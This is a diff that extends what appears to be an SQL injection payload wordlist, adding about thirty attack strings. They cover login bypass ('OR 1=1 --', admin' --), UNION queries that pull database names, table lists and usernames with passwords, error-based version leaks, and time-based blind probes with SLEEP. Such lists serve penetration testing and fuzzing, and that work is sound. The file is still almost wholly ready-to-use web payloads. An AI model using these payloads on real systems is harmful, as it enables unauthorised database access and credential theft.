@@ -83,5 +83,34 @@ true
 -1`)||`1`=(`1
 -1`)oR`1`=(`1
 1`)aND`1`=(`1
-
-
+' UNION SELECT null, null --
+' UNION SELECT 1, 2, 3 --
+' UNION SELECT null, database(), user() --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' AND 1=CAST((SELECT version()) AS int) --
+' AND 1=1 ORDER BY 100 --
+' OR '1'='1
+' OR 1=1 --
+admin' --
+' OR '1'='1' --
+") OR ("1"="1
+' OR 1=1#
+' OR '1'='1' /*
+admin' -- -
+' OR 1=1;--
+' OR 1=1; --
+' OR '1'='1'; --
+' OR ''=''; --
+admin' --
+admin' OR '1'='1
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF(1=2, SLEEP(5), 0) --
+' UNION SELECT 1, database() --
+' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /* 
+' XOR 1=1 --
+' UNION SELECT username, password FROM users --
+' AND 1=CONVERT(int, 'test') --
+' UNION SELECT null, @@version --
